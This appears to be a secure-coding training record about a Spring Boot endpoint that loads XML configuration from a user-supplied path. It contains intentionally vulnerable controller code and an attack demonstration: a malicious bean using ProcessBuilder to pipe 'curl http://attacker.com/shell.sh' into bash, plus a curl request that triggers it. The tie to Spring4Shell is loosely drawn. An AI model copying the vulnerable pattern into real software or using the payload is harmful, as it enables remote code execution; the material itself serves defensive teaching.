metadata.label_rationale: Demonstrates Spring Boot component scanning vulnerability where unrestricted @ComponentScan allows loading untrusted beans from classpath, enabling Remote Code Execution via malicious dependencies or ClassLoader manipulation (Spring4Shell variant).

context.real_world_incident: Active exploitation confirmed - GreyNoise reports 11+ IP addresses scanning for Spring4Shell (CVE-2022-22965) vulnerabilities in unrestricted component scanning configurations
context.impact: Unrestricted @ComponentScan enables Remote Code Execution via malicious beans loaded from untrusted classpath locations. Attackers can inject malicious dependencies or exploit ClassLoader manipulation to execute arbitrary code.
context.attack_vector: Attacker exploits unrestricted component scanning to load malicious beans from: (1) compromised dependencies, (2) user-controlled classpath locations, or (3) remote XML configuration loading (ClassPathXmlApplicationContext). conversations.value: I need to dynamically load configuration from user-specified paths in my Spring Boot application. Can you show me how to use ClassPathXmlApplicationContext for this?

## Concepts You Need (2 min read)

**What is Component Scanning?**

Spring Boot uses component scanning to automatically discover and register beans from specified packages. The @ComponentScan annotation tells Spring where to look for @Component, @Service, @Repository, and @Controller classes. Unrestricted scanning can load malicious beans from untrusted classpath locations.

**Why Does This Vulnerability Exist?**

When applications allow user input to control ClassLoader behavior or load configurations from untrusted sources, attackers can inject malicious bean definitions. These beans can execute arbitrary code during initialization via @PostConstruct methods, init-method callbacks, or by instantiating dangerous classes like ProcessBuilder.

**Where Might I Encounter This?**

Any Spring Boot application that: (1) loads XML configurations from user-controlled paths, (2) uses unrestricted @ComponentScan with third-party dependencies, (3) dynamically loads beans based on user input, or (4) runs on JDK 9+ with Spring Framework <5.3.18 (Spring4Shell). This affects configuration management endpoints, plugin systems, and dynamic feature loading.

---

## Real-World Incident

**Spring4Shell Remote Code Execution**. Security researchers discovered CVE-2022-22965 enabling RCE in Spring Framework applications via ClassLoader manipulation.

**Impact:** Active exploitation confirmed - GreyNoise reports 11+ IP addresses scanning for vulnerable Spring4Shell endpoints (CRITICAL) - **CVE-2022-22965**

**Discovery:** 2022-03-29 - Publicly disclosed with active scanning detected within hours
**Remediation:** Emergency patches released 2022-03-31 (Spring Framework 5.3.18+, 5.2.20+)
**CVE:** CVE-2022-22965 (CVSS 9.8)
**Affected Versions:** Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19 (JDK 9+)

---

## Vulnerable Implementation

```java
// VULNERABLE: Unsafe component loading from user input (Spring4Shell variant)
package com.example.config;

import org.springframework.web.bind.annotation.*;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.http.ResponseEntity;

@RestController
@RequestMapping("/api/config")
public class ConfigController {

    @PostMapping("/load")
    public ResponseEntity<?> loadConfiguration(@RequestParam String configPath) {

        // VULNERABLE: User input directly into ClassPathXmlApplicationContext
        // Attacker can load arbitrary XML with malicious bean definitions
        // Leads to Remote Code Execution via instantiation of arbitrary classes

        try {
            ApplicationContext context = new ClassPathXmlApplicationContext(configPath);
            return ResponseEntity.ok("Configuration loaded from: " + configPath);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Failed to load config");
        }
    }
}
```

### Attack Demonstration

**Step 1: Attacker creates malicious XML config**
```xml
<!-- attacker-hosted: http://attacker.com/rce.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!-- RCE via ProcessBuilder -->
    <bean id="rce" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>curl http://attacker.com/shell.sh | bash</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

**Step 2: Trigger remote config load**
```bash
# Attacker sends malicious config path
curl -X POST "http://victim.com/api/config/load?configPath=http://attacker.com/rce.xml"

# Server loads remote XML and instantiates ProcessBuilder
# Arbitrary commands execute with application privileges
```

**Impact:**
- Remote Code Execution via ClassLoader manipulation
- Server compromise
- Can bypass WAF since payload is in XML structure
- Active exploitation confirmed (GreyNoise reports 11+ IPs scanning)

## Common Mistakes

1. **Default credentials in production** — Deploying with default admin passwords, debug tokens, or sample API keys. Automated scanners check for common defaults within hours of deployment.

2. **Verbose error messages** — Returning stack traces, SQL error details, or internal paths to clients. Error messages should be generic externally and detailed internally (in logs).

3. **Unnecessary features enabled** — Leaving debug mode, directory listing, GraphQL introspection, or admin panels exposed in production. Disable everything not explicitly required.

4. **Missing security headers** — Not setting Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security headers. These are free defense-in-depth controls.

exploit_scenario.description: Attacker exploits unrestricted component scanning or user-controlled ClassLoader to load malicious bean definitions. By crafting malicious XML with ProcessBuilder or Runtime beans, or by injecting malicious dependencies into the classpath, the attacker achieves Remote Code Execution during bean initialization. Spring4Shell (CVE-2022-22965) exploits class.module.classLoader manipulation on JDK 9+ to execute arbitrary code.
preconditions: Application uses ClassPathXmlApplicationContext with user-controlled paths
Unrestricted @ComponentScan allows loading from untrusted packages
Application runs on JDK 9+ with vulnerable Spring Framework <5.3.18
Attacker can inject malicious dependencies or control configuration loading

secure_properties: Component scanning restricted to explicit trusted packages only
Configuration loading uses strict allowlist validation
Path traversal prevention via Path.normalize() and prefix validation
Dangerous bean types blocked via BeanFactoryPostProcessor
Bean registration audited and logged for security monitoring
negative_properties: Must not allow user input to control ClassLoader or bean instantiation
Must not scan root package or wildcard packages
Must not load XML configurations from remote URLs
Must not register beans of type ProcessBuilder, Runtime, or ScriptEngineManager
Must not allow path traversal in configuration loading
